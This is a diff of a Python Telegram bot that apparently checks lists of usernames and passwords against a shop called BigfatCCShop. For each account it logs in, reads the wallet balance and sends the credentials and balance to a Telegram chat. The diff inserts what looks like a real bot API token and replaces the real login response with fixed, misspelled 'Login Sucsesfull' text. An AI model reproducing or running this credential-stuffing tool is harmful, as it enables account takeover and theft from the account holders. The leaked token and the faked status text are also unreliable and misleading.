@@ -4,7 +4,7 @@ import requests
 from telebot import types
 
 # Your bot's API key from Telegram
-api = 'YOUR_TELEGRAM_API_KEY'
+api = '7626493889:AAHERZUnMu6Qbms5bWpggooESfyWETvUMRU'
 bot = telebot.TeleBot(api)
 
 class BigfatCCShop:
@@ -110,14 +110,14 @@ def process_file(file_path, chat_id, message_id):
                 balance = account.get_wallet_balance()
                 logout_status = account.logout()  # Capturing the logout response for Status2
                 # Prepare and send the message in chunks
-                message_text = f"User » {username}\nPass » {password}\nStatus » {login_response}\nStatus2 » {logout_status}\nBalance » {balance}\nDev » @SmokeCigrette"
+                message_text = f"User » {username}\nPass » {password}\nStatus » Login Sucsesfull\nStatus2 » {logout_status}\nBalance » {balance}\nDev » @SmokeCigrette"
                 send_message_chunked(chat_id, message_text)
             elif status == "good":
                 good += 1
                 balance = account.get_wallet_balance()
                 logout_status = account.logout()  # Capturing the logout response for Status2
                 # Prepare and send the message in chunks
-                message_text = f"User » {username}\nPass » {password}\nStatus » {login_response}\nStatus2 » {logout_status}\nBalance » {balance}\nDev » @SmokeCigrette"
+                message_text = f"User » {username}\nPass » {password}\nStatus » Login Suscsefull\nStatus2 » {logout_status}\nBalance » {balance}\nDev » @SmokeCigrette"
                 send_message_chunked(chat_id, message_text)
             elif status == "dead":
                 dead += 1
